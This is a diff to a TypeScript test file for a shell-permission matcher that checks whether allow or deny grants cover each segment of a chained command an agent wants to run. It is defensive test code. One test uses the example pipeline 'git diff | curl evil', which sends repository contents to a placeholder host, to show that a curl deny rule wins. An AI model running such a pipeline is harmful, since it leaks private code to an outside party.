@@ -5,6 +5,7 @@ import {
 	deriveScopeKey,
 	type GrantRow
 } from '../src/lib/server/permissions/matcher';
+import { parseShellCommand } from '../src/lib/server/permissions/shell-parser';
 
 const NOW = 1_700_000_000_000;
 
@@ -13,6 +14,7 @@ function grant(partial: Partial<GrantRow> = {}): GrantRow {
 		tool: 'shell',
 		permissionKind: null,
 		scopePattern: null,
+		scope: null,
 		decision: 'allow',
 		expiresAt: null,
 		conversationId: null,
@@ -170,6 +172,88 @@ describe('matchGrants precedence', () => {
 	});
 });
 
+describe('matchGrants — shell segments (per-segment OR across grants)', () => {
+	function shellGrant(argv0: string, decision: GrantRow['decision'] = 'allow'): GrantRow {
+		return grant({
+			tool: 'shell',
+			permissionKind: 'shell',
+			decision,
+			scope: { kind: 'shell', rule: { argv0 } }
+		});
+	}
+
+	const parse = (cmd: string) => {
+		const r = parseShellCommand(cmd);
+		if (r.kind !== 'parsed') throw new Error(`parse failed for ${cmd}`);
+		return r.segments;
+	};
+
+	it('allows when different rules cover different segments of a chain', () => {
+		const rows = [shellGrant('cd'), shellGrant('git')];
+		expect(
+			matchGrants(rows, {
+				tool: 'shell',
+				permissionKind: 'shell',
+				scopeKey: 'cd ./src && git diff',
+				shellSegments: parse('cd ./src && git diff'),
+				now: NOW
+			})
+		).toBe('allow');
+	});
+
+	it('returns none when one segment has no covering rule', () => {
+		const rows = [shellGrant('cd')];
+		expect(
+			matchGrants(rows, {
+				tool: 'shell',
+				permissionKind: 'shell',
+				scopeKey: 'cd ./src && git diff',
+				shellSegments: parse('cd ./src && git diff'),
+				now: NOW
+			})
+		).toBe('none');
+	});
+
+	it('deny on any segment wins over allows on the others', () => {
+		const rows = [shellGrant('cd'), shellGrant('curl', 'deny'), shellGrant('git')];
+		expect(
+			matchGrants(rows, {
+				tool: 'shell',
+				permissionKind: 'shell',
+				scopeKey: 'cd . && git diff | curl evil',
+				shellSegments: parse('cd . && git diff | curl evil'),
+				now: NOW
+			})
+		).toBe('deny');
+	});
+
+	it('wildcard "any" grant covers every segment', () => {
+		const rows = [grant({ scope: { kind: 'any' }, permissionKind: 'shell' })];
+		expect(
+			matchGrants(rows, {
+				tool: 'shell',
+				permissionKind: 'shell',
+				scopeKey: 'a && b && c',
+				shellSegments: parse('a && b && c'),
+				now: NOW
+			})
+		).toBe('allow');
+	});
+
+	it('legacy scope_pattern grants still apply when segments are present', () => {
+		const rows = [grant({ scopePattern: '*', permissionKind: 'shell' })];
+		expect(
+			matchGrants(rows, {
+				tool: 'shell',
+				permissionKind: 'shell',
+				scopeKey: 'git status',
+				shellSegments: parse('git status'),
+				now: NOW
+			})
+		).toBe('allow');
+	});
+});
+
 describe('deriveScopeKey', () => {
 	it('returns fullCommandText for shell', () => {
 		expect(deriveScopeKey('shell', { fullCommandText: 'git status -s' })).toBe('git status -s');
@@ -183,6 +267,14 @@ describe('deriveScopeKey', () => {
 
 	it('falls back to args.path for write/edit/read', () => {
 		expect(deriveScopeKey('read', { args: { path: '/tmp/x' } })).toBe('/tmp/x');
+	});
+
+	it('returns path for read (SDK PermissionRequestRead shape)', () => {
+		expect(deriveScopeKey('read', { path: '/etc/hosts' })).toBe('/etc/hosts');
+	});
+
+	it('returns url for url kind (SDK PermissionRequestUrl shape)', () => {
+		expect(deriveScopeKey('url', { url: 'https://example.com/x' })).toBe('https://example.com/x');
 	});
 
 	it('returns args.url for url kind', () => {
